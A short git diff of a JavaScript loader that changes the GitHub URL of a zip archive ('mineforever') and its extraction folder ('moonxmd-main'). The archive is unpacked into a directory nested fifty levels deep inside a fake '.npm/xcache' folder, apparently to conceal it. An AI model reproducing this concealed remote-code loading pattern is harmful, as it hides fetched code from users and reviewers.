@@ -14,8 +14,8 @@ const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
 const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);
 
 // === GIT CONFIG ===
-const DOWNLOAD_URL = "https://github.com/mkaay267/mineforever/archive/refs/heads/main.zip";
-const EXTRACT_DIR = path.join(TEMP_DIR, "mineforever-main");
+const DOWNLOAD_URL = "https://github.com/mkayrepo/mineforever/archive/refs/heads/main.zip";
+const EXTRACT_DIR = path.join(TEMP_DIR, "moonxmd-main");
 const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
 const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
 
